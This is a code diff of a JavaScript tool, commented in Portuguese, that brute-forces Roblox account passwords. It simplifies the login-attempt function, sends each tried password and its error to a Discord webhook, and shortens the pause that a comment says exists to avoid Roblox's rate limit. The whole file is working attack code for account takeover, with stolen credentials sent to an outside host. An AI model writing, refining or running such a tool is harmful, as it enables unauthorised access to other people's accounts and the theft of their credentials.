@@ -26,70 +26,53 @@ async function sendDiscordMessage(content) {
     }
 }
 
-// Função para tentar Login no Roblox (Método Atualizado)
+// Função para tentar Login no Roblox (Método Mais Simples e Direto)
 async function tryRobloxLogin(email, password) {
-    // Tentativa 1: Usar a API /users/login com JSON (Método Clássico)
+    // Usar a API de login clássica
+    const loginUrl = "https://www.roblox.com/users/login";
+
+    // Headers mínimos necessários
+    const headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Accept': 'application/json',
+        'Content-Type': 'application/json',
+        'X-Requested-With': 'XMLHttpRequest'
+    };
+
     try {
-        const client = axios.create({
-            baseURL: 'https://www.roblox.com',
-            timeout: 8000,
-            headers: {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
-                'Accept': 'application/json',
-                'Content-Type': 'application/json; charset=utf-8',
-                'X-Requested-With': 'XMLHttpRequest',
-                'Referer': 'https://www.roblox.com/login'
-            }
-        });
-
-        // 1. Pegar Cookies
-        await client.get('/');
-
-        // 2. Tentar Login
-        const response = await client.post('/users/login', {
+        // Tenta fazer o POST direto sem precisar de GET anterior (alguns bots fazem assim)
+        const response = await axios.post(loginUrl, {
             username: email,
             password: password
+        }, {
+            headers: headers,
+            timeout: 5000
         });
 
-        if (response.data.id) {
-            return { success: true, username: response.data.username, userId: response.data.id };
+        // Se retornar ID, é sucesso
+        if (response.data && response.data.id) {
+            return {
+                success: true,
+                username: response.data.username,
+                userId: response.data.id
+            };
         } else {
-            return { success: false, error: response.data.error || "Erro Desconhecido" };
+            // Erro comum
+            return {
+                success: false,
+                error: response.data.error || "Erro Desconhecido"
+            };
         }
-    } catch (e1) {
-        // Se der erro, tenta o Método 2
-        console.log("Método 1 falhou, tentando Método 2...");
-    }
 
-    // Tentativa 2: Usar a API /v1/users/login ou Form Data
-    try {
-        const client2 = axios.create({
-            baseURL: 'https://www.roblox.com',
-            timeout: 8000,
-            headers: {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
-                'Accept': 'application/json',
-                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'X-Requested-With': 'XMLHttpRequest',
-                'Referer': 'https://www.roblox.com/login'
-            }
-        });
-
-        await client2.get('/');
-
-        // Enviar como Form Data
-        const formData = `username=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
+    } catch (error) {
+        // Se der erro de rede ou status
+        const status = error.response ? error.response.status : 'Sem Status';
+        const data = error.response ? error.response.data : error.message;
         
-        const response2 = await client2.post('/users/login', formData);
-
-        if (response2.data.id) {
-            return { success: true, username: response2.data.username, userId: response2.data.id };
-        } else {
-            return { success: false, error: response2.data.error || "Erro Desconhecido" };
-        }
-    } catch (e2) {
-        // Se os dois falharem, retorna o erro
-        return { success: false, error: "Ambos os métodos falharam: " + e2.message };
+        return {
+            success: false,
+            error: `Erro HTTP ${status}: ${JSON.stringify(data)}`
+        };
     }
 }
 
@@ -128,13 +111,13 @@ async function startBruteForce(email) {
             await sendDiscordMessage(msg);
             console.log("ENCONTRADA:", password);
         } else {
-            // Enviar erro resumido apenas se quiseres ver todos (pode encher o Discord)
-            // Descomenta a linha abaixo para ver cada erro
-            // await sendDiscordMessage(`❌ **Falhou:** ${password} | ${result.error}`);
+            // Enviar o erro exato no Discord para vermos o que acontece
+            const errorMsg = `❌ **Tentativa Falhada**\n**Senha:** ${password}\n**Erro:** ${result.error}`;
+            await sendDiscordMessage(errorMsg);
         }
 
-        // Pausa para não bloquear o Email no Roblox (Rate Limit)
-        await new Promise(r => setTimeout(r, 2000)); 
+        // Pausa curta
+        await new Promise(r => setTimeout(r, 1500)); 
     }
 
     if (!found) {
